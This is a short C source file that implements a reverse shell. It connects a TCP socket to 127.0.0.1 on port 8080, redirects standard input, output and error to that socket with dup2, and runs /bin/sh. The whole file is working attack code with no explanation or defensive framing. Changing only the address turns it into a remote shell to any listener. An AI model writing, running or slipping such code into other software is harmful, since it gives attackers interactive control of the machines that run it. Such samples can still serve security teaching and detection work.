#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() 
{
	int sock = socket(AF_INET,SOCK_STREAM,0);
	struct sockaddr_in sock_addr;
	sock_addr.sin_family = AF_INET;
	sock_addr.sin_port = htons(8080);
	sock_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	connect(sock, (struct sockaddr*)&sock_addr,sizeof(sock_addr));

	dup2(sock,STDIN_FILENO);
	dup2(sock,STDOUT_FILENO);
	dup2(sock,STDERR_FILENO);
	execl("/bin/sh",NULL);
}
